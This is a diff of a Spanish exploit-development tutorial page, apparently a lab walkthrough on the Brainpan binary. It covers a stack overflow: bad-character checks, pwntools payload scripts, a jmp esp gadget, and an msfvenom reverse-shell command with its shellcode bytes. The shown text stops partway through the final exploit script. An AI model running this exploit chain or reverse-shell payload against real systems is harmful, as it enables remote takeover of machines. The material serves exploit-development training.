+eax=ffffffff ebx=00388000 ecx=3117303f edx=005ff700 esi=31171280 edi=31171280
 eip=42424242 esp=005ff910 ebp=41414141 iopl=0         nv up ei ng nz na pe nc
 cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010286
 42424242 ??              ???
 
-</span><span class="ro">0:000></span><span class="p"> !py mona compare -f bytearray.bin -a esp
-Hold on...
-[+] Command used:
-!py C:\Users\user\Documents\WinDbgX\x86\mona.py compare -f bytearray.bin -a esp
-[+] Reading file C:\mona\bytearray.bin...
-    Read 256 bytes from file
-[+] Preparing output file 'compare.txt'
-    - (Re)setting logfile C:\mona\compare.txt
-[+] Generating module info table, hang on...
-    - Processing modules
-    - Done. Let's rock 'n roll.
-[+] C:\mona\bytearray.bin has been recognized as RAW bytes.
-[+] Fetched 256 bytes successfully from C:\mona\bytearray.bin
-    - Comparing 1 location(s)
-Comparing bytes from file with memory :
-0x005ff910 | [+] Comparing with memory at location : 0x005ff910 (Stack)
-0x005ff910 | Only 1 original bytes of 'normal' code found.
-0x005ff910 |     ,-----------------------------------------------.
-0x005ff910 |     | Comparison results:                           |
-0x005ff910 |     |-----------------------------------------------|
-0x005ff910 |   0 |00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f| File
-0x005ff910 |     |   fb 5f 00 30 fb 5f 00 e8 03 00 00 00 00 00 00| Memory
-0x005ff910 |  10 |10 11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f| File
-0x005ff910 |     |00 00 8c 00 70 00 00 00 01 00 00 00 00 00 8c 00| Memory
-0x005ff910 |  20 |20 21 22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f| File
-0x005ff910 |     |48 20 00 00 0f 00 00 00 00 00 00 00 10 00 00 00| Memory
-0x005ff910 |  30 |30 31 32 33 34 35 36 37 38 39 3a 3b 3c 3d 3e 3f| File
-0x005ff910 |     |00 00 00 00 68 69 8c 00 03 00 00 05 10 00 00 00| Memory
-0x005ff910 |  40 |40 41 42 43 44 45 46 47 48 49 4a 4b 4c 4d 4e 4f| File
-0x005ff910 |     |02 00 dd 34 c0 a8 64 49 00 00 00 00 00 00 00 00| Memory
-0x005ff910 |  50 |50 51 52 53 54 55 56 57 58 59 5a 5b 5c 5d 5e 5f| File
-0x005ff910 |     |02 00 27 0f 00 00 00 00 00 00 00 00 0f 00 00 00| Memory
-0x005ff910 |  60 |60 61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f| File
-0x005ff910 |     |90 00 00 00 00 00 00 00 34 01 00 00 3c 01 00 00| Memory
-0x005ff910 |  70 |70 71 72 73 74 75 76 77 78 79 7a 7b 7c 7d 7e 7f| File
-0x005ff910 |     |02 02 02 02 57 69 6e 53 6f 63 6b 20 32 2e 30 00| Memory
-0x005ff910 |  80 |80 81 82 83 84 85 86 87 88 89 8a 8b 8c 8d 8e 8f| File
-0x005ff910 |     |48 66 8c 00 03 00 00 00 00 00 8c 00 4c 00 8c 00| Memory
-0x005ff910 |  90 |90 91 92 93 94 95 96 97 98 99 9a 9b 9c 9d 9e 9f| File
-0x005ff910 |     |60 69 8c 00 00 00 8c 00 14 00 04 10 14 00 00 00| Memory
-0x005ff910 |  a0 |a0 a1 a2 a3 a4 a5 a6 a7 a8 a9 aa ab ac ad ae af| File
-0x005ff910 |     |f8 fa 5f 00 a1 09 78 77 01 00 00 00 68 69 8c 00| Memory
-0x005ff910 |  b0 |b0 b1 b2 b3 b4 b5 b6 b7 b8 b9 ba bb bc bd be bf| File
-0x005ff910 |     |14 00 00 00 36 0c 78 77 45 44 d0 11 60 69 8c 00| Memory
-0x005ff910 |  c0 |c0 c1 c2 c3 c4 c5 c6 c7 c8 c9 ca cb cc cd ce cf| File
-0x005ff910 |     |00 00 8c 00 00 00 00 00 01 00 00 00 14 00 00 00| Memory
-0x005ff910 |  d0 |d0 d1 d2 d3 d4 d5 d6 d7 d8 d9 da db dc dd de df| File
-0x005ff910 |     |68 69 8c 00 00 00 00 00 a5 45 d0 04 60 69 01 00| Memory
-0x005ff910 |  e0 |e0 e1 e2 e3 e4 e5 e6 e7 e8 e9 ea eb ec ed ee ef| File
-0x005ff910 |     |00 00 8c 00 f8 69 8c 00 95 fb 0b 66 63 69 8c 00| Memory
-0x005ff910 |  f0 |f0 f1 f2 f3 f4 f5 f6 f7 f8 f9 fa fb fc fd fe ff| File
-0x005ff910 |     |1a 00 07 1d 62 69 8c 00 98 66 8c 00 14 00 00 00| Memory
-0x005ff910 |     `-----------------------------------------------'
-0x005ff910 | 
-0x005ff910 |             | File      | Memory    | Note       
-0x005ff910 | -------------------------------------------------
-0x005ff910 | 0 0 1   1   | 00        | 00        | unmodified!
-0x005ff910 | 1 1 255 255 | 01 ... ff | fb ... 00 | corrupted  
-0x005ff910 | 
-0x005ff910 | Possibly bad chars: 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f 10 11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f 20 21 22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f 30 31 32 33 34 35 36 37 38 39 3a 3b 3c 3d 3e 3f 40 41 42 43 44 45 46 47 48 49 4a 4b 4c 4d 4e 4f 50 51 52 53 54 55 56 57 58 59 5a 5b 5c 5d 5e 5f 60 61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70 71 72 73 74 75 76 77 78 79 7a 7b 7c 7d 7e 7f 80 81 82 83 84 85 86 87 88 89 8a 8b 8c 8d 8e 8f 90 91 92 93 94 95 96 97 98 99 9a 9b 9c 9d 9e 9f a0 a1 a2 a3 a4 a5 a6 a7 a8 a9 aa ab ac ad ae af b0 b1 b2 b3 b4 b5 b6 b7 b8 b9 ba bb bc bd be bf c0 c1 c2 c3 c4 c5 c6 c7 c8 c9 ca cb cc cd ce cf d0 d1 d2 d3 d4 d5 d6 d7 d8 d9 da db dc dd de df e0 e1 e2 e3 e4 e5 e6 e7 e8 e9 ea eb ec ed ee ef f0 f1 f2 f3 f4 f5 f6 f7 f8 f9 fa fb fc fd fe ff  
-0x005ff910 | </span>
+</span><span class="ro">0:000></span><span class="p"> db esp
+005ff910  00 fb 5f 00 30 fb 5f 00-e8 03 00 00 00 00 00 00  .._.0._.........
+005ff920  f9 c8 30 47 92 00 00 00-02 00 04 06 00 00 6d 00  ..0G..........m.
+005ff930  3c 01 04 39 00 00 6d 00-80 77 6e 00 10 00 00 00  <..9..m..wn.....
+005ff940  00 00 6d 00 00 00 6d 00-bd 2b a4 77 58 74 6e 00  ..m...m..+.wXtn.
+005ff950  02 00 e7 d6 c0 a8 64 05-00 00 00 00 00 00 00 00  ......d.........
+005ff960  02 00 27 0f 00 00 00 00-38 78 6e 00 63 01 00 50  ..'.....8xn.c..P
+005ff970  09 00 00 00 cf fe ff ff-4c 01 00 00 48 01 00 00  ........L...H...
+005ff980  02 02 02 02 57 69 6e 53-6f 63 6b 20 32 2e 30 00  ....WinSock 2.0.</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Creamos un nuevo <code class="language-plaintext highlighter-rouge">bytearray</code> esta vez quitando el <code class="language-plaintext highlighter-rouge">\x00</code> que vimos es un badchar</p>
+<p class="plain-text">Modificamos el script ahora con el nuevo <code class="language-plaintext highlighter-rouge">bytearray</code> que no incluye el caractér <code class="language-plaintext highlighter-rouge">0x00</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ro">0:000> </span><span class="p">!py mona bytearray -cpb '\x00'
-Hold on...
-[+] Command used:
-!py C:\Users\user\Documents\WinDbgX\x86\mona.py bytearray -cpb '\x00'
-Generating table, excluding 1 bad chars...
-Dumping table to file
-[+] Preparing output file 'bytearray.txt'
-    - (Re)setting logfile C:\mona\bytearray.txt
-"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"  
-"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"  
-"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"  
-"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"  
-"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"  
-"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"  
-"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"  
-"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"  
-
-Done, wrote 255 bytes to file C:\mona\bytearray.txt
-Binary output saved in C:\mona\bytearray.bin</span>
+<code><span class="p">badbytes </span><span class="o">= </span><span class="na">bytes</span><span class="p">(</span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi"> 256</span><span class="p">)).translate(</span><span class="mi">None</span><span class="p">, </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">)</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Modificamos el script ahora con el nuevo <code class="language-plaintext highlighter-rouge">bytearray</code> que no incluye el caracter <code class="language-plaintext highlighter-rouge">\x00</code></p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="c1">#!/usr/bin/python3
-</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote
-
-offset </span><span class="o">= </span><span class="mi">524</span><span class="p">
-junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
-
-badchars </span><span class="o"> = </span><span class="no">b</span><span class="s">""</span><span class="p">
-badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20</span><span class="s">"</span><span class="p">  
-badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span class="s">"</span><span class="p">  
-badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60</span><span class="s">"</span><span class="p">  
-badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80</span><span class="s">"</span><span class="p">  
-badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0</span><span class="s">"</span><span class="p">  
-badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0</span><span class="s">"</span><span class="p">  
-badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0</span><span class="s">"</span><span class="p">  
-badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s">"</span><span class="p">  
-
-payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
-payload </span><span class="o">+= </span><span class="p">junk
-payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
-payload </span><span class="o">+= </span><span class="p">badchars
-
-shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)  
-shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">, payload)</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Enviamos y al volver a hacer el <code class="language-plaintext highlighter-rouge">mona compare</code> podemos ver <code class="language-plaintext highlighter-rouge">unmodified</code> quiere decir que todos los caracteres enviados se procesaron correctamente en el programa</p>
+<p class="plain-text">Enviamos y volvemos a comparar los bytes, podemos ver que todos los bytes se almacenaron correctamente en el programa por lo que no hay mas <code class="language-plaintext highlighter-rouge">badbytes</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">0:000> </span><span class="p">g
-(a80.12a8): Access violation - code c0000005 (first chance)
+ModLoad: 72d50000 72da4000   C:\WINDOWS\SysWOW64\mswsock.dll
+(57d4.4b18): Access violation - code c0000005 (first chance)
 First chance exceptions are reported before any exception handling.
 This exception may be expected and handled.
-eax=ffffffff ebx=003f6000 ecx=3117303f edx=005ff700 esi=31171280 edi=31171280
+eax=ffffffff ebx=00241000 ecx=3117303f edx=005ff700 esi=31171280 edi=31171280
 eip=42424242 esp=005ff910 ebp=41414141 iopl=0         nv up ei ng nz na pe nc
 cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010286
 42424242 ??              ???
 
-</span><span class="ro">0:000></span><span class="p"> !py mona compare -f bytearray.bin -a esp
-Hold on...
-[+] Command used:
-!py C:\Users\user\Documents\WinDbgX\x86\mona.py compare -f bytearray.bin -a esp  
-[+] Reading file C:\mona\bytearray.bin...
-    Read 255 bytes from file
-[+] Preparing output file 'compare.txt'
-    - (Re)setting logfile C:\mona\compare.txt
-[+] Generating module info table, hang on...
-    - Processing modules
-    - Done. Let's rock 'n roll.
-[+] C:\mona\bytearray.bin has been recognized as RAW bytes.
-[+] Fetched 255 bytes successfully from C:\mona\bytearray.bin
-    - Comparing 1 location(s)
-Comparing bytes from file with memory :
-0x005ff910 | [+] Comparing with memory at location : 0x005ff910 (Stack)
-0x005ff910 | !!! Hooray, normal shellcode unmodified !!!
-0x005ff910 | Bytes omitted from input: 00</span>
+</span><span class="ro">0:000></span><span class="p"> db esp L100
+005ff910  01 02 03 04 05 06 07 08-09 0a 0b 0c 0d 0e 0f 10  ................
+005ff920  11 12 13 14 15 16 17 18-19 1a 1b 1c 1d 1e 1f 20  ............... 
+005ff930  21 22 23 24 25 26 27 28-29 2a 2b 2c 2d 2e 2f 30  !"#$%&'()*+,-./0
+005ff940  31 32 33 34 35 36 37 38-39 3a 3b 3c 3d 3e 3f 40  123456789:;<=>?@
+005ff950  41 42 43 44 45 46 47 48-49 4a 4b 4c 4d 4e 4f 50  ABCDEFGHIJKLMNOP
+005ff960  51 52 53 54 55 56 57 58-59 5a 5b 5c 5d 5e 5f 60  QRSTUVWXYZ[\]^_`
+005ff970  61 62 63 64 65 66 67 68-69 6a 6b 6c 6d 6e 6f 70  abcdefghijklmnop
+005ff980  71 72 73 74 75 76 77 78-79 7a 7b 7c 7d 7e 7f 80  qrstuvwxyz{|}~..
+005ff990  81 82 83 84 85 86 87 88-89 8a 8b 8c 8d 8e 8f 90  ................
+005ff9a0  91 92 93 94 95 96 97 98-99 9a 9b 9c 9d 9e 9f a0  ................
+005ff9b0  a1 a2 a3 a4 a5 a6 a7 a8-a9 aa ab ac ad ae af b0  ................
+005ff9c0  b1 b2 b3 b4 b5 b6 b7 b8-b9 ba bb bc bd be bf c0  ................
+005ff9d0  c1 c2 c3 c4 c5 c6 c7 c8-c9 ca cb cc cd ce cf d0  ................
+005ff9e0  d1 d2 d3 d4 d5 d6 d7 d8-d9 da db dc dd de df e0  ................
+005ff9f0  e1 e2 e3 e4 e5 e6 e7 e8-e9 ea eb ec ed ee ef f0  ................
+005ffa00  f1 f2 f3 f4 f5 f6 f7 f8-f9 fa fb fc fd fe ff 0a  ................</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Listando los modulos con <code class="language-plaintext highlighter-rouge">mona</code> encontramos que solo esta <code class="language-plaintext highlighter-rouge">brainpan.exe</code> sin nunguna proteccion, asi que podemos inyectar <code class="language-plaintext highlighter-rouge">shellcode</code> malicioso en la pila</p>
+<p class="plain-text">Si miramos con <code class="language-plaintext highlighter-rouge">ropper</code> encontramos que el binario <code class="language-plaintext highlighter-rouge">brainpan.exe</code> no tiene ninguna protección, asi que podemos ejecutar un <code class="language-plaintext highlighter-rouge">shellcode</code> malicioso en la pila.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ro">0:000></span><span class="p"> !py mona modules
-Hold on...
-[+] Command used:
-!py C:\Users\user\Documents\WinDbgX\x86\mona.py modules
+<code><span class="ve">❯ ropper </span><span class="p"> --file brainpan.exe --dllcharacteristics
 
-[+] Processing arguments and criteria
-    - Pointer access level : X
-[+] Generating module info table, hang on...
-    - Processing modules
-    - Done. Let's rock 'n roll.
-----------------------------------------------------------------------------------------------------------------------------------------------------
- Module info :
-----------------------------------------------------------------------------------------------------------------------------------------------------
- Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | CFG   | NXCompat | OS Dll | Modulename & Pathname
-----------------------------------------------------------------------------------------------------------------------------------------------------
- 0x76b10000 | 0x76d92000 | 0x00282000 | True   | False   | True  | True  |  True    | True   | [KERNELBASE.dll] (C:\Windows\SysWOW64\KERNELBASE.dll)
- 0x72e80000 | 0x72ed1000 | 0x00051000 | True   | False   | True  | True  |  True    | True   | [mswsock.dll] (C:\Windows\SysWOW64\mswsock.dll)
- 0x76880000 | 0x76970000 | 0x000f0000 | True   | False   | True  | True  |  True    | True   | [KERNEL32.DLL] (C:\Windows\SysWOW64\KERNEL32.DLL)
- 0x31170000 | 0x31176000 | 0x00006000 | False  | False   | False | False |  False   | False  | [brainpan.exe] (C:\Users\user\Desktop\brainpan.exe)
- 0x756b0000 | 0x75774000 | 0x000c4000 | True   | False   | True  | True  |  True    | True   | [msvcrt.dll] (C:\Windows\SysWOW64\msvcrt.dll)
- 0x77730000 | 0x778e2000 | 0x001b2000 | True   | False   | True  | True  |  True    | True   | [ntdll.dll] (ntdll.dll)
- 0x76970000 | 0x76a2a000 | 0x000ba000 | True   | False   | True  | True  |  True    | True   | [RPCRT4.dll] (C:\Windows\SysWOW64\RPCRT4.dll)
- 0x75360000 | 0x753bf000 | 0x0005f000 | True   | False   | True  | True  |  True    | True   | [WS2_32.DLL] (C:\Windows\SysWOW64\WS2_32.DLL)
-----------------------------------------------------------------------------------------------------------------------------------------------------
+DllCharacteristics
+==================
 
-[+] Preparing output file 'modules.txt'
-    - (Re)setting logfile C:\mona\modules.txt</span>
+Name                 Value
+----                 -----
+</span><span class="az">DynamicBase</span><span class="ve">          NO
+</span><span class="az">ForceIntegrity</span><span class="ve">       NO
+</span><span class="az">NxCompat</span><span class="ve">             NO
+</span><span class="az">No Isolation</span><span class="ve">         NO
+</span><span class="az">No SEH</span><span class="ve">               NO
+</span><span class="az">No Bind</span><span class="ve">              NO
+</span><span class="az">WdmDriver</span><span class="ve">            NO
+</span><span class="az">ControlFLowGuard</span><span class="ve">     NO
+</span><span class="az">TerminalServerAware</span><span class="ve">  NO</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Sabemos que el resto de los datos se guardan en el stack, para que se interprete necesitamos un gadget que ejecute la instrucción <code class="language-plaintext highlighter-rouge">jmp esp</code> o una equivalente</p>
+<p class="plain-text">Sabemos que el resto de los datos se guardan en el stack, para que se interprete necesitamos un gadget que ejecute la instrucción <code class="language-plaintext highlighter-rouge">jmp esp</code> o una equivalente.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ro">0:000></span><span class="p"> !py mona jmp -r esp -m brainpan.exe
-Hold on...
-[+] Command used:
-!py C:\Users\user\Documents\WinDbgX\x86\mona.py jmp -r esp -m brainpan.exe
+<code><span class="ve">❯ ropper </span><span class="p">--file brainpan.exe --jmp esp
 
-[+] Processing arguments and criteria
-    - Pointer access level : X
-    - Only querying modules brainpan.exe
-[+] Generating module info table, hang on...
-    - Processing modules
-    - Done. Let's rock 'n roll.
-[+] Querying 1 modules
-    - Querying module brainpan.exe
-    - Search complete, processing results
-[+] Preparing output file 'jmp.txt'
-    - (Re)setting logfile C:\mona\jmp.txt
-[+] Writing results to C:\mona\jmp.txt
-    - Number of pointers of type 'jmp esp' : 1 
-[+] Results : 
-0x311712f3 |   0x311712f3 : jmp esp |  {PAGE_EXECUTE_READ} [brainpan.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\user\Desktop\brainpan.exe)  
-    Found a total of 1 pointers</span>
+JMP Instructions
+================
+
+</span><span class="ro">0x311712f3</span><span class="p">:</span><span class="am"> jmp</span><span class="p"> esp</span><span class="az">;
+</span><span class="p">
+1 gadgets found</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Finalmente solo necesitamos el shellcode que se interpretará al saltar al stack, podemos crear uno facilmente con <code class="language-plaintext highlighter-rouge">msfvenom</code> que nos envie una revshell, esto indicando los badchars para que el shellcode no los tenga y evite problemas</p>
+<p class="plain-text">Ahora solo necesitamos el shellcode que se interpretará al saltar al stack, podemos crear uno fácilmente con <code class="language-plaintext highlighter-rouge">msfvenom</code> que nos envie una revshell, esto lo haremos indicando los badbytes para que el shellcode no los tenga y evitar problemas, usaremos también un encoder específico como <code class="language-plaintext highlighter-rouge">x86/jmp_call_additive</code> porque sabemos que las instrucciones de <a href="/exploit-development/windows-user/stack-overflow#shikata">x86/shikata_ga_nai</a> nos darán problemas.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ msfvenom</span><span class="p"> -p windows/shell_reverse_tcp LHOST=192.168.100.73 LPORT=443 -b </span><span class="am">'\x00'</span><span class="p"> -f python -v shellcode  
-[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-[-] No arch selected, selecting arch: x86 from the payload
-Found 11 compatible encoders
-Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
-x86/shikata_ga_nai succeeded with size 351 (iteration=0)
-x86/shikata_ga_nai chosen with final size 351
-Payload size: 351 bytes
-Final size of python file: 1965 bytes
-shellcode =  b""
-shellcode += b"\xda\xd8\xd9\x74\x24\xf4\xbb\xf4\x3a\xcb\xbd"
-shellcode += b"\x5d\x2b\xc9\xb1\x52\x83\xc5\x04\x31\x5d\x13"
-shellcode += b"\x03\xa9\x29\x29\x48\xad\xa6\x2f\xb3\x4d\x37"
-shellcode += b"\x50\x3d\xa8\x06\x50\x59\xb9\x39\x60\x29\xef"
-shellcode += b"\xb5\x0b\x7f\x1b\x4d\x79\xa8\x2c\xe6\x34\x8e"
-shellcode += b"\x03\xf7\x65\xf2\x02\x7b\x74\x27\xe4\x42\xb7"
-shellcode += b"\x3a\xe5\x83\xaa\xb7\xb7\x5c\xa0\x6a\x27\xe8"
-shellcode += b"\xfc\xb6\xcc\xa2\x11\xbf\x31\x72\x13\xee\xe4"
-shellcode += b"\x08\x4a\x30\x07\xdc\xe6\x79\x1f\x01\xc2\x30"
-shellcode += b"\x94\xf1\xb8\xc2\x7c\xc8\x41\x68\x41\xe4\xb3"
-shellcode += b"\x70\x86\xc3\x2b\x07\xfe\x37\xd1\x10\xc5\x4a"
-shellcode += b"\x0d\x94\xdd\xed\xc6\x0e\x39\x0f\x0a\xc8\xca"
-shellcode += b"\x03\xe7\x9e\x94\x07\xf6\x73\xaf\x3c\x73\x72"
-shellcode += b"\x7f\xb5\xc7\x51\x5b\x9d\x9c\xf8\xfa\x7b\x72"
-shellcode += b"\x04\x1c\x24\x2b\xa0\x57\xc9\x38\xd9\x3a\x86"
-shellcode += b"\x8d\xd0\xc4\x56\x9a\x63\xb7\x64\x05\xd8\x5f"
-shellcode += b"\xc5\xce\xc6\x98\x2a\xe5\xbf\x36\xd5\x06\xc0"
-shellcode += b"\x1f\x12\x52\x90\x37\xb3\xdb\x7b\xc7\x3c\x0e"
-shellcode += b"\x2b\x97\x92\xe1\x8c\x47\x53\x52\x65\x8d\x5c"
-shellcode += b"\x8d\x95\xae\xb6\xa6\x3c\x55\x51\x09\x68\x31"
-shellcode += b"\xe8\xe1\x6b\xb9\xeb\x4a\xe2\x5f\x81\xbc\xa3"
-shellcode += b"\xc8\x3e\x24\xee\x82\xdf\xa9\x24\xef\xe0\x22"
-shellcode += b"\xcb\x10\xae\xc2\xa6\x02\x47\x23\xfd\x78\xce"
-shellcode += b"\x3c\x2b\x14\x8c\xaf\xb0\xe4\xdb\xd3\x6e\xb3"
-shellcode += b"\x8c\x22\x67\x51\x21\x1c\xd1\x47\xb8\xf8\x1a"
-shellcode += b"\xc3\x67\x39\xa4\xca\xea\x05\x82\xdc\x32\x85"
-shellcode += b"\x8e\x88\xea\xd0\x58\x66\x4d\x8b\x2a\xd0\x07"
-shellcode += b"\x60\xe5\xb4\xde\x4a\x36\xc2\xde\x86\xc0\x2a"
-shellcode += b"\x6e\x7f\x95\x55\x5f\x17\x11\x2e\xbd\x87\xde"
-shellcode += b"\xe5\x05\xb7\x94\xa7\x2c\x50\x71\x32\x6d\x3d"
-shellcode += b"\x82\xe9\xb2\x38\x01\x1b\x4b\xbf\x19\x6e\x4e"
-shellcode += b"\xfb\x9d\x83\x22\x94\x4b\xa3\x91\x95\x59"</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Nuestro exploit final llena con <code class="language-plaintext highlighter-rouge">524 A's</code> el espacio que existe antes de sobrescribir el return address que se sobrescribe con un gadget que ejecuta un <code class="language-plaintext highlighter-rouge">jmp esp</code> y al estar el shellcode que creamos en el stack cuando salta nos envia una revshell</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="c1">#!/usr/bin/python3
-</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, p32
-
-offset</span><span class="o"> =</span><span class="mi"> 524</span><span class="p">
-junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
-
-shellcode</span><span class="o"> =</span><span class="no">  b</span><span class="s">""</span><span class="p">
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xda\xd8\xd9\x74\x24\xf4\xbb\xf4\x3a\xcb\xbd</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x5d\x2b\xc9\xb1\x52\x83\xc5\x04\x31\x5d\x13</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x03\xa9\x29\x29\x48\xad\xa6\x2f\xb3\x4d\x37</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x50\x3d\xa8\x06\x50\x59\xb9\x39\x60\x29\xef</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xb5\x0b\x7f\x1b\x4d\x79\xa8\x2c\xe6\x34\x8e</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x03\xf7\x65\xf2\x02\x7b\x74\x27\xe4\x42\xb7</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x3a\xe5\x83\xaa\xb7\xb7\x5c\xa0\x6a\x27\xe8</span><span class="s">"</span><span class="p">  
